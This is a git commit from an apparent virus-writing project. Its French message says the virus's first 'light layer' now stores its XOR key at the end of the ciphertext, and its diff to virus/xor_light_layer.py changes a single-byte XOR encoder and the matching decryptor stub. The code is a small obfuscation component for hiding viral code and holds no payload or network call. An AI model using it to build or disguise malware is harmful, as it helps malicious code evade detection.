0e626db86837a9322721e5ff3555c4a45b7abf9f
ClementNotin <clement@notin.org>
2013-03-05 00:00:39 +0100

    [Virus] La première couche légère stocke la clé à la fin du chiffré, pour changer :p

--- virus/xor_light_layer.py
+++ virus/xor_light_layer.py
@@ -5,12 +5,12 @@ import random
 
 def a(c):
     k = chr(random.randint(0, 255))
-    return k + "".join(chr(ord(c) ^ ord(k)) for c in c)
+    return "".join(chr(ord(c) ^ ord(k)) for c in c) + k
 
 
 DECRYPT = """
 def b(c):
-    k = c[0]
+    k = c[-1]
 
-    return "".join(chr(ord(c) ^ ord(k)) for c in c[1:])
+    return "".join(chr(ord(c) ^ ord(k)) for c in c[:-1])
 """
